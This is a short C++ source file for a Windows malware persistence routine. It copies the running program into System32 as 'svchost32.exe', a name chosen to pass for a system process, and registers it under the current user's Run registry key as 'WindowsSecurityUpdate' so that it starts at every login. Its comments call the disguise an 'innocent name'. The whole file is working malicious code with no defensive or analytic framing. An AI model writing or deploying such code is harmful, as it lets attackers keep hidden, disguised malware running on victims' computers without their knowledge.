#include "persistence.h"
#include <windows.h>
#include <string>

using namespace std;

// Install persistence mechanism
void install_persistence() {
    char currentPath[MAX_PATH];
    GetModuleFileNameA(NULL, currentPath, MAX_PATH);
    
    // Copy to Windows directory with innocent name
    char winDir[MAX_PATH];
    GetWindowsDirectoryA(winDir, MAX_PATH);
    string targetPath = string(winDir) + "\\System32\\svchost32.exe";
    
    CopyFileA(currentPath, targetPath.c_str(), FALSE);
    
    // Add registry entry for persistence
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
                     "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
                     0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "WindowsSecurityUpdate", 0, REG_SZ, 
                      (BYTE*)targetPath.c_str(), targetPath.length() + 1);
        RegCloseKey(hKey);
    }
}